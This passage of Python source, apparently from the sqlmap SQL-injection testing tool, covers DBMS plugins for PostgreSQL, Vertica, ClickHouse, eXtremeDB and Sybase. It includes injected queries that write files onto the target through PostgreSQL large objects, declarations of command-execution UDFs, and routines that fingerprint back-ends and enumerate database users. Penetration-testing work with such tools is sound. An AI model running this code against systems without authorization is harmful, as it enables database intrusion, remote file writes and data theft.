self.fileToSqlQueries(fcEncodedList)\n\n            for sqlQuery in sqlQueries:\n                inject.goStacked(sqlQuery)\n\n            inject.goStacked(\"INSERT INTO pg_largeobject VALUES (%d, %d, DECODE((SELECT %s FROM %s), 'base64'))\" % (self.oid, self.page, self.tblField, self.fileTblName))\n            inject.goStacked(\"DELETE FROM %s\" % self.fileTblName)\n\n            self.page += 1\n\n        debugMsg = \"exporting the OID %s file content to \" % fileType\n        debugMsg += \"file '%s'\" % remoteFile\n        logger.debug(debugMsg)\n\n        inject.goStacked(\"SELECT lo_export(%d, '%s')\" % (self.oid, remoteFile), silent=True)\n\n        written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)\n\n        inject.goStacked(\"SELECT lo_unlink(%d)\" % self.oid)\n\n        return written\n", "plugins/dbms/postgresql/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import PGSQL_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\nfrom plugins.dbms.postgresql.enumeration import Enumeration\nfrom plugins.dbms.postgresql.filesystem import Filesystem\nfrom plugins.dbms.postgresql.fingerprint import Fingerprint\nfrom plugins.dbms.postgresql.syntax import Syntax\nfrom plugins.dbms.postgresql.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass PostgreSQLMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines PostgreSQL methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = PGSQL_SYSTEM_DBS\n        self.sysUdfs = {\n            # UDF name: UDF parameters' input data-type and return data-type\n            \"sys_exec\": {\"input\": [\"text\"], \"return\": \"int4\"},\n            \"sys_eval\": {\"input\": [\"text\"], \"return\": \"text\"},\n            \"sys_bineval\": {\"input\": [\"text\"], \"return\": \"int4\"},\n            \"sys_fileread\": {\"input\": [\"text\"], \"return\": \"text\"}\n        }\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.PGSQL] = Syntax.escape\n", "plugins/dbms/vertica/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getRoles(self, *args, **kwargs):\n        warnMsg = \"on Vertica it is not possible to enumerate the user roles\"\n        logger.warning(warnMsg)\n\n        return {}\n", "plugins/dbms/vertica/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import vertica_python\nexcept:\n    pass\n\nimport logging\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://github.com/vertica/vertica-python\n    User guide: https://github.com/vertica/vertica-python/blob/master/README.md\n    API: https://www.python.org/dev/peps/pep-0249/\n    License: Apache 2.0\n    \"\"\"\n\n    def connect(self):\n        self.initConnection()\n\n        try:\n            self.connector = vertica_python.connect(host=self.hostname, user=self.user, password=self.password, database=self.db, port=self.port, connection_timeout=conf.timeout)\n        except vertica_python.OperationalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.initCursor()\n        self.printConnected()\n\n    def fetchall(self):\n        try:\n            return self.cursor.fetchall()\n        except vertica_python.ProgrammingError as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n            return None\n\n    def execute(self, query):\n        try:\n            self.cursor.execute(query)\n        except (vertica_python.OperationalError, vertica_python.ProgrammingError) as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n        except vertica_python.InternalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.connector.commit()\n\n    def select(self, query):\n        self.execute(query)\n        return self.fetchall()\n", "plugins/dbms/vertica/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT (CHR(97)||CHR(98)||CHR(99)||CHR(100)||CHR(101)||CHR(102)||CHR(103)||CHR(104)) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"(%s)\" % \"||\".join(\"CHR(%d)\" % _ for _ in getOrds(value))\n\n        return Syntax._escape(expression, quote, escaper)\n", "plugins/dbms/vertica/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import VERTICA_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.VERTICA)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.VERTICA\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(VERTICA_ALIASES):\n            setDbms(DBMS.VERTICA)\n\n            self.getBanner()\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.VERTICA\n        logger.info(infoMsg)\n\n        # NOTE: Vertica works too without the CONVERT_TO()\n        result = inject.checkBooleanExpression(\"BITSTRING_TO_BINARY(NULL) IS NULL\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.VERTICA\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"HEX_TO_INTEGER(NULL) IS NULL\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.VERTICA\n                logger.warning(warnMsg)\n\n                return False\n\n            setDbms(DBMS.VERTICA)\n\n            self.getBanner()\n\n            if not conf.extensiveFp:\n                return True\n\n            infoMsg = \"actively fingerprinting %s\" % DBMS.VERTICA\n            logger.info(infoMsg)\n\n            if inject.checkBooleanExpression(\"CALENDAR_HIERARCHY_DAY(NULL) IS NULL\"):\n                Backend.setVersion(\">= 9.0\")\n            else:\n                Backend.setVersion(\"< 9.0\")\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.VERTICA\n            logger.warning(warnMsg)\n\n            return False\n", "plugins/dbms/vertica/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Vertica it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on Vertica it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on Vertica it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on Vertica it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/vertica/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    pass\n", "plugins/dbms/vertica/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import VERTICA_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\n\nfrom plugins.dbms.vertica.enumeration import Enumeration\nfrom plugins.dbms.vertica.filesystem import Filesystem\nfrom plugins.dbms.vertica.fingerprint import Fingerprint\nfrom plugins.dbms.vertica.syntax import Syntax\nfrom plugins.dbms.vertica.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass VerticaMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines Vertica methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = VERTICA_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.VERTICA] = Syntax.escape\n", "plugins/dbms/clickhouse/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getPasswordHashes(self):\n        warnMsg = \"on ClickHouse it is not possible to enumerate the user password hashes\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getRoles(self, *args, **kwargs):\n        warnMsg = \"on ClickHouse it is not possible to enumerate the user roles\"\n        logger.warning(warnMsg)\n\n        return {}\n", "plugins/dbms/clickhouse/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    pass\n", "plugins/dbms/clickhouse/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT char(97)||char(98)||char(99)||char(100)||char(101)||char(102)||char(103)||char(104) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"||\".join(\"char(%d)\" % _ for _ in getOrds(value))\n\n        return Syntax._escape(expression, quote, escaper)\n", "plugins/dbms/clickhouse/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import CLICKHOUSE_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.CLICKHOUSE)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.CLICKHOUSE\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(CLICKHOUSE_ALIASES):\n            setDbms(DBMS.CLICKHOUSE)\n\n            self.getBanner()\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.CLICKHOUSE\n        logger.info(infoMsg)\n        \n        result = inject.checkBooleanExpression(\"halfMD5('abcd')='16356072519128051347'\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.CLICKHOUSE\n            logger.info(infoMsg)\n            result = inject.checkBooleanExpression(\"generateUUIDv4(1)!=generateUUIDv4(2)\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.CLICKHOUSE\n                logger.warn(warnMsg)\n\n                return False\n            \n            setDbms(DBMS.CLICKHOUSE)\n            self.getBanner()\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.CLICKHOUSE\n            logger.warn(warnMsg)\n\n            return False\n", "plugins/dbms/clickhouse/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on ClickHouse it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on ClickHouse it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on ClickHouse it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on ClickHouse it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/clickhouse/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on ClickHouse it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on ClickHouse it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/clickhouse/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import CLICKHOUSE_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\n\nfrom plugins.dbms.clickhouse.enumeration import Enumeration\nfrom plugins.dbms.clickhouse.filesystem import Filesystem\nfrom plugins.dbms.clickhouse.fingerprint import Fingerprint\nfrom plugins.dbms.clickhouse.syntax import Syntax\nfrom plugins.dbms.clickhouse.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass ClickHouseMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines ClickHouse methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = CLICKHOUSE_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.CLICKHOUSE] = Syntax.escape\n", "plugins/dbms/extremedb/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getBanner(self):\n        warnMsg = \"on eXtremeDB it is not possible to get the banner\"\n        logger.warning(warnMsg)\n\n        return None\n\n    def getCurrentUser(self):\n        warnMsg = \"on eXtremeDB it is not possible to enumerate the current user\"\n        logger.warning(warnMsg)\n\n    def getCurrentDb(self):\n        warnMsg = \"on eXtremeDB it is not possible to get name of the current database\"\n        logger.warning(warnMsg)\n\n    def isDba(self, user=None):\n        warnMsg = \"on eXtremeDB it is not possible to test if current user is DBA\"\n        logger.warning(warnMsg)\n\n    def getUsers(self):\n        warnMsg = \"on eXtremeDB it is not possible to enumerate the users\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def getPasswordHashes(self):\n        warnMsg = \"on eXtremeDB it is not possible to enumerate the user password hashes\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getPrivileges(self, *args, **kwargs):\n        warnMsg = \"on eXtremeDB it is not possible to enumerate the user privileges\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getDbs(self):\n        warnMsg = \"on eXtremeDB it is not possible to enumerate databases (use only '--tables')\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def searchDb(self):\n        warnMsg = \"on eXtremeDB it is not possible to search databases\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def searchTable(self):\n        warnMsg = \"on eXtremeDB it is not possible to search tables\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def searchColumn(self):\n        warnMsg = \"on eXtremeDB it is not possible to search columns\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def search(self):\n        warnMsg = \"on eXtremeDB search option is not available\"\n        logger.warning(warnMsg)\n\n    def getHostname(self):\n        warnMsg = \"on eXtremeDB it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n\n    def getStatements(self):\n        warnMsg = \"on eXtremeDB it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n", "plugins/dbms/extremedb/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    def connect(self):\n        errMsg = \"on eXtremeDB it is not (currently) possible to establish a \"\n        errMsg += \"direct connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/extremedb/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT 'abcdefgh' FROM foobar\"\n        True\n        \"\"\"\n\n        return expression\n", "plugins/dbms/extremedb/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import EXTREMEDB_ALIASES\nfrom lib.core.settings import METADB_SUFFIX\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.EXTREMEDB)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.EXTREMEDB\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(EXTREMEDB_ALIASES):\n            setDbms(DBMS.EXTREMEDB)\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.EXTREMEDB\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"signature(NULL)=usignature(NULL)\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.EXTREMEDB\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"hashcode(NULL)>=0\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.EXTREMEDB\n                logger.warning(warnMsg)\n\n                return False\n\n            setDbms(DBMS.EXTREMEDB)\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.EXTREMEDB\n            logger.warning(warnMsg)\n\n            return False\n\n    def forceDbmsEnum(self):\n        conf.db = (\"%s%s\" % (DBMS.EXTREMEDB, METADB_SUFFIX)).replace(' ', '_')\n", "plugins/dbms/extremedb/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on eXtremeDB it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on eXtremeDB it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on eXtremeDB it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on eXtremeDB it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/extremedb/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on eXtremeDB it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on eXtremeDB it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/extremedb/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import EXTREMEDB_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\nfrom plugins.dbms.extremedb.enumeration import Enumeration\nfrom plugins.dbms.extremedb.filesystem import Filesystem\nfrom plugins.dbms.extremedb.fingerprint import Fingerprint\nfrom plugins.dbms.extremedb.syntax import Syntax\nfrom plugins.dbms.extremedb.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass ExtremeDBMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines eXtremeDB methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = EXTREMEDB_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.EXTREMEDB] = Syntax.escape\n", "plugins/dbms/sybase/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.common import filterPairValues\nfrom lib.core.common import isListLike\nfrom lib.core.common import isTechniqueAvailable\nfrom lib.core.common import readInput\nfrom lib.core.common import safeSQLIdentificatorNaming\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.common import unsafeSQLIdentificatorNaming\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import paths\nfrom lib.core.data import queries\nfrom lib.core.dicts import SYBASE_TYPES\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.exception import SqlmapMissingMandatoryOptionException\nfrom lib.core.exception import SqlmapNoneDataException\nfrom lib.core.exception import SqlmapUserQuitException\nfrom lib.core.settings import CURRENT_DB\nfrom lib.utils.brute import columnExists\nfrom lib.utils.pivotdumptable import pivotDumpTable\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\nfrom thirdparty import six\nfrom thirdparty.six.moves import zip as _zip\n\nclass Enumeration(GenericEnumeration):\n    def getUsers(self):\n        infoMsg = \"fetching database users\"\n        logger.info(infoMsg)\n\n        rootQuery = queries[DBMS.SYBASE].users\n\n        query = rootQuery.inband.query\n\n        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:\n            blinds = (False, True)\n        else:\n            blinds = (True,)\n\n        for blind in blinds:\n            retVal = pivotDumpTable(\"(%s) AS %s\" % (query, kb.aliasName), ['%s.name' % kb.aliasName], blind=blind, alias=kb.aliasName)\n\n            if retVal:\n                kb.data.cachedUsers = list(retVal[0].values())[0]\n                break\n\n        return kb.data.cachedUsers\n\n    def getPrivileges(self, *args, **kwargs):\n        warnMsg = \"on Sybase it is not possible to fetch \"\n        warnMsg += \"database users privileges, sqlmap will check whether \"\n        warnMsg += \"or not the database users are database administrators\"\n        logger.warning(warnMsg)\n\n        users = []\n        areAdmins = set()\n\n        if conf.user:\n            users = [conf.user]\n        elif not len(kb.data.cachedUsers):\n            users = self.getUsers()\n        else:\n            users = kb.data.cachedUsers\n\n        for user in users:\n            user = unArrayizeValue(user)\n\n            if user is None:\n                continue\n\n            isDba = self.isDba(user)\n\n            if isDba is True:\n                areAdmins.add(user)\n\n            kb.data.cachedUsersPrivileges[user] = None\n\n        return (kb.data.cachedUsersPrivileges, areAdmins)\n\n    def getDbs(self):\n        if len(kb.data.cachedDbs) > 0:\n            return kb.data.cachedDbs\n\n        infoMsg = \"fetching database names\"\n        logger.info(infoMsg)\n\n        rootQuery = queries[DBMS.SYBASE].dbs\n        query = rootQuery.inband.query\n\n        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:\n            blinds = [False, True]\n        else:\n            blinds = [True]\n\n        for blind in blinds:\n            retVal = pivotDumpTable(\"(%s) AS %s\" % (query, kb.aliasName), ['%s.name' % kb.aliasName], blind=blind, alias=kb.aliasName)\n\n            if retVal:\n                kb.data.cachedDbs = next(six.itervalues(retVal[0]))\n                break\n\n        if kb.data.cachedDbs:\n            kb.data.cachedDbs.sort()\n\n        return 